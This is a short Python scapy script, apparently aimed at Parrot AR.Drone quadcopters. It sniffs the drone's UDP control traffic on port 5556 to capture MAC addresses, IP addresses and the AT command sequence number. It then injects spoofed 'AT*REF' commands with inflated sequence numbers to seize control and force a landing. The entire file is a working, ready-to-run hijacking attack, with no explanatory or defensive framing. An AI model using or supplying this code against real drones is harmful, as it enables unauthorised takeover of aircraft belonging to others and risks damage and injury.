from scapy.all import *
from time import sleep
import re

##################
#global variables#
##################
srcMAC= ""
dstMAC= ""
srcIP = ""
dstIP = ""
seqNr = ""
interface = "wlan0"

##############################################
# Sniff the MAC, IP address & sequence number#
##############################################

def pkt_callback(pkt):
	global srcMAC, dstMAC, srcIP, dstIP, seqNr
	pkt.show() # debug statement
	if Raw in pkt and 'AT*' in pkt[Raw].load and srcMAC == "":
		srcMAC= pkt[Ether].src
		dstMAC= pkt[Ether].dst
		srcIP = pkt[IP].src
		dstIP = pkt[IP].dst
		#parse the sequence number
		p = re.compile("=(\d+),")
		m = p.search(pkt[Raw].load)
		seqNr = int(m.group(1))

sniff(iface=interface, prn=pkt_callback, filter="udp and port 5556", count = 10)

################################
# Send the spoofed LAND packets#
################################

for i in range(1, 10):
	payload = "AT*REF=" + str(seqNr+1000000+i) + ",290717696\r"
	print payload
	spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
	sendp(spoofed_packet, iface=interface)
	sleep(0.3)

#################################
#restore control after 5 seconds#
#################################
sleep(5)
payload = "AT*REF=1,290717696\r"
print payload
spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
sendp(spoofed_packet, iface=interface)

